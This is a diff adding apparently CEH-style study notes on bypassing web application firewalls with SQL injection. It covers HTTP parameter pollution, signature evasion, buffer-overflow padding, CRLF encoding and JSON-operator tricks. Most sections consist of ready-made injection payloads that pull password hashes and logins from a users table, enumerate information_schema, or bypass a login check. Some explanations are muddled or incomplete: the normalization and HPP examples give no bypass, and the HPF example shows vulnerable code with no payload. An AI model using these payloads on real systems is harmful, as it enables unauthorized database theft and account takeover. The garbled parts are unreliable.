@@ -1,0 +1,116 @@
+Bypassing the WAF using SQL injection vulnerability is a major threat, as it is capable of retrieving the whole database from the server
+
+
+▪ Normalization Method
+The systematic representation of a database in the normalization process sometimes leads to an SQL injection attack.
+
+If an attacker is able to detect any vulnerability in functional dependencies, then the attacker changes the structure of the SQL query to perform the attack
+
+For example, if the SQL query is in the following format, it is impossible for an attacker to perform an SQL injection attack to bypass the WAF: /?id=1+union+select+1,2,3/*
+
+
+▪ HPP Technique
+
+HTTP parameter pollution (HPP) is an easy and effective technique that affects both the server and the client with the feasibility to override or add HTTP GET/POST parameters by injecting delimiting characters in query strings.
+
+For example, if a WAF protects any website, then the following request does not allow the attacker to perform the attack: /?id=1;select+1,2,3+from+users+where+id=1--
+
+
+▪ HPF technique
+HTTP parameter fragmentation (HPF) is basically used with the idea of bypassing security filters, as it is capable of operating HTTP data directly. 
+
+This technique can be used along with HPP using a UNION operator to bypass firewalls.
+
+For example, consider the vulnerable code given below.
+Query("select * from table where a=".$_GET['a']." and b=".$_GET['b']);
+
+
+▪ Blind SQL Injection
+A blind SQL injection attack is one of the easiest way to exploit a vulnerability, as it replaces WAF signatures with their synonyms using SQL functions
+
+Logical requests AND/OR:
+o /?id=1+OR+0x50=0x50
+o /?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1) ))=74
+
+Negation, inequality signs, and logical request
+o and 1 
+o and 1=1 
+o and 2<3 
+o and 'a'='a' 
+o and 'a'<>'b' 
+o and 3<=2
+
+
+▪ Signature Bypass
+An attacker can transform the signature of SQL queries such that a firewall cannot detect them, leading to malicious results.
+
+Attackers obtain signatures used by the firewall using the following request:
+/?id=1+union+(select+1,2+from+users) 
+
+After obtaining the signature, the attacker exploits the acquired signature to bypass the WAF as follows:
+o /?id=1+union+(select+'xz'from+xxx) 
+o /?id=(1)union(select(1),mid(hash,1,32)from(users)) 
+o /?id=1+union+(select'1',concat(login,hash)from+users) 
+o /?id=(1)union(((((((select(1),hex(hash)from(users))))))))
+o /?id=xx(1)or(0x50=0x50)
+
+
+▪ Buffer Overflow Method
+An attacker can use the buffer overflow method to crash and bypass the firewall.
+
+As most firewalls are developed in C/C++, it is easy for the attacker to bypass the firewall.
+
+For example, consider the following URL on which the attacker is trying to perform an SQL injection attack to bypass the WAF:
+http:// www.certifiedhacker.com//index.php?page_id=15+and+(select 1)=(Select 0xAA[..(add about 1200 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4....
+
+The attacker can use the following query to test if the firewall can be crashed:
+?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/ %0A/*nnaa*/+1,2,3,4...
+
+If the attacker gets the 500 error message as the response, he/she can easily bypass the firewall using the buffer overflow method
+
+
+▪ CRLF Technique
+
+Carriage return, line feed (CRLF) is a pair of ASCII codes, 13 and 10. 
+
+In Windows, CRLF is used to indicate the end of a line in a text file (\r\n). Macintosh uses CR (\r) alone and UNIX uses LF(\n) alone
+
+The attacker can use the CRLF technique to bypass the firewall. For example, the attacker uses the following URL to bypass the WAF:
+http://www.certifiedhacker.com/info.php?id=1+%0A%0Dunion%0A%0D+%0A%0 Dselect%0A%0D+1,2,3,4,5--
+
+
+▪ Integration Method
+The integration method involves using different bypassing techniques together to increase the chances of bypassing the firewall, where a single method or technology is not sufficient to do so
+
+An attacker may use the following queries together to bypass the firewall:
+www.certifiedhacker.com/index.php?page_id=21+and+(select 1)=(Select 0xAA[..(add about 1200 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,5...
+
+id=10/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()–-
+
+
+Bypassing WAF using JSON-based SQL Injection Attack 
+
+Attackers often attempt to manipulate JSON input to execute arbitrary SQL commands in a database. 
+
+This is possible if a vulnerable web application accepts the JSON content as input via a POST request without proper validation or sanitization. 
+
+Normally, web application firewalls can detect special characters such as =, <, >, etc. 
+
+Therefore, instead of using these special characters, attackers can use JSON operators in the input fields, as shown below: 
+‘or‘ {"key": "value"}’ ? “key”
+
+For example: 
+▪ Consider the following arbitrary JSON data given as input to the web application. 
+{"user": "<username>' --","pass": "irrelevant"}
+
+▪ The server constructs an SQL query that skips the verification of the user account password and logs in the user.
+SELECT * FROM users WHERE username = '<username>' --' AND password = 'irrelevant';
+
+
+
+
+
+
+
+
+
